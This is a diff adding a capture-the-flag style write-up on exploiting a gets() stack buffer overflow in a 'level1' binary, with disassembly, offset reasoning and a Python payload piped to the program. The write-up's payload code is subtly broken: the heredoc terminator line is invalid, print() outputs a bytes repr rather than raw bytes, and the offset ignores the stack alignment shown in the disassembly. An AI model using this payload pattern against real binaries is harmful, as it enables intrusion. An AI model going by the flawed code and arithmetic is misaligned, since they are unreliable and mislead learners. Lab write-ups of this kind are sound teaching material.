@@ -1,0 +1,67 @@
+# Level 1 - Buffer Overflow via `gets()`
+
+## Vulnerability Summary
+
+The `main` function contains a critical **stack-based buffer overflow** vulnerability. The unsafe `gets()` function reads user input into a fixed-size buffer without bounds checking, allowing an attacker to overflow the buffer and overwrite the return address.
+
+## Assembly Disassembly (`disassemble main`)
+
+```
+   0x08048480 <+0>:     push   %ebp
+   0x08048481 <+1>:     mov    %esp,%ebp
+   0x08048483 <+3>:     and    $0xfffffff0,%esp      ; Align stack to 16-byte boundary
+   0x08048486 <+6>:     sub    $0x50,%esp            ; Allocate 0x50 (80 bytes) on stack
+   0x08048489 <+9>:     lea    0x10(%esp),%eax       ; Load buffer address (ESP + 0x10)
+   0x0804848d <+13>:    mov    %eax,(%esp)           ; Pass buffer pointer to gets()
+   0x08048490 <+16>:    call   0x8048340 <gets@plt>  ; Call gets() - reads unbounded input
+   0x08048495 <+21>:    leave                        ; Restore stack frame
+   0x08048496 <+22>:    ret                          ; Return from main
+```
+
+## Key Analysis Points
+
+**Buffer Size**: The allocation is `0x50` (80 bytes). The buffer starts at `ESP + 0x10` (16 bytes from ESP).
+- Available stack space for buffer: 0x50 - 0x10 = 0x40 (64 bytes)
+
+**The Vulnerability**: `gets()` reads input until newline/EOF with **no length limit**. If input exceeds 64 bytes:
+- Overflows beyond the buffer boundary
+- Overwrites saved `%ebp` (4 bytes after buffer)
+- Overwrites saved return address (4 bytes after `%ebp`)
+- Can hijack control flow
+
+## Exploitation Strategy
+
+To exploit this, craft a payload that:
+1. **Fills the buffer** with 64 bytes of padding (junk data)
+2. **Overwrites saved `%ebp`** with 4 garbage bytes
+3. **Overwrites return address** with an address pointing to:
+   - Shellcode that spawns a shell
+   - A ROP chain to call `system("/bin/sh")`
+   - Address of `system()` function in libc
+
+## Example Exploitation (Pseudocode)
+
+```bash
+# Generate payload: 64 bytes padding + 4 bytes for %ebp + 4 bytes return address
+python3 << 'EOF'
+import struct
+offset = 64 + 4  # buffer + saved %ebp
+target_address = 0x08048400  # Example: address of desired code
+
+payload = b'A' * offset + struct.pack('<I', target_address)
+print(payload, end='')
+EOF | ./level1
+```
+
+## Steps to Solve
+
+1. **Find the target address** (e.g., address of `system()` or ROP gadget) using gdb or objdump
+2. **Calculate offset** to return address: buffer size (64) + saved %ebp (4) = 68 bytes
+3. **Craft payload**: padding + target address
+4. **Send payload** to the binary via stdin to trigger execution
+
+## Notes
+
+- The vulnerable `gets()` is removed from modern C standards — use `fgets()` or `read()` with size limits instead
+- ASLR and stack canaries can mitigate this attack; check binary protections with `checksec`
+- Only exploit vulnerabilities in systems you own or authorized challenge environments	
